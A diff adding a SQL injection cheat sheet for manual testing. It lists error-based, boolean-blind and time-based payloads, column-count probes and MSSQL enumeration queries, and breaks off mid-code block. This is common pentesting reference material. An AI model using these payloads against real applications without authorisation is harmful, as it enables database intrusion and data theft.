@@ -1,0 +1,56 @@
+# SQL Injection (SQLi) Cheat Sheet
+
+A practical reference guide for manual SQL injection, focusing on identifying injection points, extracting data, and bypassing Web Application Firewalls (WAFs). 
+
+---
+
+## 1. Injection Types & Basic Testing
+Before exploiting, identify how the application handles input.
+
+### Error-Based Testing
+Force a syntax error to see if the database errors are reflected on the page.
+*   `'`
+*   `''`
+*   `\`
+*   `')`
+*   `';`
+
+### Boolean-Based (Blind) Testing
+Ask the database True/False questions and observe how the page changes.
+*   **True Condition:** `' AND 1=1-- -` (Page loads normally)
+*   **False Condition:** `' AND 1=2-- -` (Page is blank or different)
+
+### Time-Based (Blind) Testing
+Ask the database to delay its response if the condition is true.
+*   **MSSQL:** `'; WAITFOR DELAY '0:0:5'-- -`
+*   **MySQL:** `' OR SLEEP(5)-- -`
+*   **PostgreSQL:** `'; SELECT pg_sleep(5)-- -`
+
+---
+
+## 2. Determining Column Count
+To use `UNION SELECT`, the number of columns in your payload must match the original query.
+
+### Method 1: ORDER BY
+Increment the number until the application throws an error.
+*   `' ORDER BY 1-- -`
+*   `' ORDER BY 5-- -` (Keep incrementing until it breaks)
+
+### Method 2: UNION SELECT NULL
+Increment the `NULL` values until the page loads successfully.
+*   `' UNION SELECT NULL-- -`
+*   `' UNION SELECT NULL, NULL, NULL-- -`
+
+---
+
+## 3. Microsoft SQL Server (MSSQL) Specifics
+
+### Fingerprinting
+*   **Version:** `@@version`
+*   **Current User:** `USER_NAME()` or `SYSTEM_USER`
+*   **Current Database:** `DB_NAME()`
+
+### Enumerating Databases, Tables, and Columns
+*   **List all databases:**
+    ```sql
+    (SELECT STRING_AGG(name, ', ') FROM sys.databases)
